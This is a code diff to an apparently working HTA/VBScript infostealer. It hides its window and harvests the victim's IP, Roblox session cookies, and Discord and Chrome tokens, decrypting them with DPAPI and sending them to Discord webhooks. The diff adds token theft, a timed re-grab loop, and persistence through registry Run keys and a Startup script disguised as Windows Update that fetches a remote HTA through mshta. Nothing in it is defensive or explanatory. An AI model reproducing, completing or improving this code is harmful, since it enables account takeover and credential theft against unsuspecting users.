@@ -5,28 +5,42 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH_ALL, PC, USER
+Dim sh, fso, WH_ALL, WH_REGRAB, PAYLOAD_URL, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
+' --- WEBHOOKS & PAYLOAD URL ---
 WH_ALL = "https://discord.com/api/webhooks/1570885190283427920/MLaG7_qcj28QnQaiyHgm_eaF1p0rj4NUP8ZDh98cFG42MOaHFhhcqsEwzgZsiIpp10Vs"
+WH_REGRAB = "https://discord.com/api/webhooks/1570885290833350747/cnNXdcvYzTDTnUX0tW5ti5d3juq54PPmUl978MgXbWWzF11h_8YMKB-IbV3KnQvPwMPW"
+
+PAYLOAD_URL = "mshta https://dicerigx.app/"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Send IP ---
-Call IP()
+' --- Initial Grab (All Logs) ---
+Call IP(True)
+Call GrabRoblox(True)
+Call GrabTokens(True)
+Call Persistence(True)
 
-' --- Send Cookie ---
-Call GrabRoblox()
+' --- Re-run grab chain 4x (every 5 min) (Re-Grab only) ---
+Dim runCount
+For runCount = 1 To 4
+    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REGRAB)
+    Call IP(False)
+    Call GrabRoblox(False)
+    Call GrabTokens(False)
+    If runCount < 4 Then Call SleepMinutes(5)
+Next
 
-' --- Wait and Close ---
-Call SleepSeconds(5)
+' --- KILL SELF ---
+Call SleepSeconds(4)
 sh.Run "taskkill /f /im mshta.exe", 0, False
 window.close()
 
 ' --- IP Function ---
-Sub IP()
+Sub IP(isFirstGrab)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", "https://api.ipify.org/", False
@@ -39,12 +53,12 @@ Sub IP()
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbedTo(":dart: Target Info", info, 3447003, WH_ALL)
+    Call RouteMessage(":dart: Target Info", info, 3447003, isFirstGrab)
     Set xh = Nothing
 End Sub
 
 ' --- GrabRoblox Function ---
-Sub GrabRoblox()
+Sub GrabRoblox(isFirstGrab)
     Dim paths(7)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
     paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
@@ -60,40 +74,61 @@ Sub GrabRoblox()
     Next
     
     If Len(fp) = 0 Then Exit Sub
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
+    
+    ' Read as binary to get proper hex bytes
+    Dim stream: Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' adTypeBinary
+    stream.Open
+    stream.LoadFromFile fp
+    raw = stream.Read
+    stream.Close
+    Set stream = Nothing
+
+    ' Convert binary to a readable string, stripping non-printable chars
+    Dim strRaw: strRaw = ""
+    Dim j, b
+    For j = 1 To LenB(raw)
+        b = AscB(MidB(raw, j, 1))
+        If b >= 32 And b <= 126 Then
+            strRaw = strRaw & Chr(b)
+        End If
+    Next
 
     Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+    Dim sp: sp = InStr(strRaw, "_|WARNING")
+    If sp > 0 Then
+        cookie = Mid(strRaw, sp)
+    Else
+        Dim cp: cp = InStr(strRaw, "CookiesData")
+        If cp > 0 Then
+            Dim eqp: eqp = InStr(cp, strRaw, ":")
+            If eqp > 0 Then
+                Dim qp1: qp1 = InStr(eqp, strRaw, """")
+                If qp1 > 0 Then
+                    Dim qp2: qp2 = InStr(qp1 + 1, strRaw, """")
+                    If qp2 > qp1 Then
+                        Dim b64: b64 = Mid(strRaw, qp1 + 1, qp2 - qp1 - 1)
+                        If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+                    End If
+                End If
             End If
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
-    End If
-    If Len(cookie) = 0 Then cookie = raw
+
+    If Len(cookie) = 0 Then cookie = strRaw
 
     cookie = Replace(cookie, vbCr, "")
     cookie = Replace(cookie, vbLf, "")
     cookie = Replace(cookie, vbTab, "")
     cookie = Trim(cookie)
+    
     Dim sc: sc = InStr(cookie, ";")
     If sc > 0 Then cookie = Left(cookie, sc - 1)
     cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
 
     If Len(cookie) > 50 Then
-        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, WH_ALL)
-        Call PostFileTo("cookie.txt", cookie, WH_ALL)
+        Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
+        Call RouteFile("cookie.txt", cookie, isFirstGrab)
     End If
 End Sub
 
@@ -115,7 +150,7 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Sleep Function ---
+' --- Sleep Functions ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -130,6 +165,91 @@ Sub SleepSeconds(s)
             If t2 < t1 Then t2 = t2 + 86400
             If (t2 - t1) >= (s - elapsed) Then Exit Do
         Loop
+    End If
+End Sub
+
+Sub SleepMinutes(m)
+    Call SleepSeconds(m * 60)
+End Sub
+
+' --- Persistence ---
+Sub Persistence(isFirstGrab)
+    On Error Resume Next
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", PAYLOAD_URL, "REG_SZ"
+
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
+    sf.Close
+
+    Call RouteMessage(":pushpin: Persistence", "Startup installed to boot HTA", 65280, isFirstGrab)
+End Sub
+
+' --- GrabTokens (Native LevelDB Extraction) ---
+Sub GrabTokens(isFirstGrab)
+    Dim basePaths(3)
+    basePaths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord"
+    basePaths(1) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary"
+    basePaths(2) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb"
+    basePaths(3) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default"
+
+    Dim i
+    For i = 0 To 3
+        Dim ldbPath: ldbPath = basePaths(i) & "\Local Storage\leveldb"
+        If fso.FolderExists(ldbPath) Then
+            Dim files, f
+            Set files = fso.GetFolder(ldbPath).Files
+            For Each f In files
+                If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 3) = ".log" Then
+                    Dim raw: raw = ReadFile(f.Path)
+                    If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
+                        Dim chunks: chunks = Split(raw, vbLf)
+                        Dim line
+                        For Each line In chunks
+                            If InStr(line, "dQw4w9WgXcQ:") > 0 Then
+                                Dim token: token = ExtractToken(line)
+                                If Len(token) > 50 Then
+                                    Dim info: info = "**Token found**" & vbCrLf & token
+                                    Call RouteMessage(":gift: Discord Token", info, 5793266, isFirstGrab)
+                                    Call RouteFile("discord_token.txt", token, isFirstGrab)
+                                End If
+                            End If
+                        Next
+                    End If
+                End If
+            Next
+        End If
+    Next
+End Sub
+
+Function ExtractToken(s)
+    ExtractToken = ""
+    Dim p: p = InStr(s, "dQw4w9WgXcQ:")
+    If p > 0 Then
+        p = p + 12
+        Dim ep: ep = InStr(p, s, """")
+        If ep > p Then
+            Dim b64: b64 = Mid(s, p, ep - p)
+            ExtractToken = DecryptDPAPI(b64)
+        End If
+    End If
+End Function
+
+' --- Routing ---
+Sub RouteMessage(t, d, c, isFirstGrab)
+    If isFirstGrab Then
+        Call PostEmbedTo(t, d, c, WH_ALL)
+    Else
+        Call PostEmbedTo(t, d, c, WH_REGRAB)
+    End If
+End Sub
+
+Sub RouteFile(fn, ct, isFirstGrab)
+    If isFirstGrab Then
+        Call PostFileTo(fn, ct, WH_ALL)
+    Else
+        Call PostFileTo(fn, ct, WH_REGRAB)
     End If
 End Sub
 
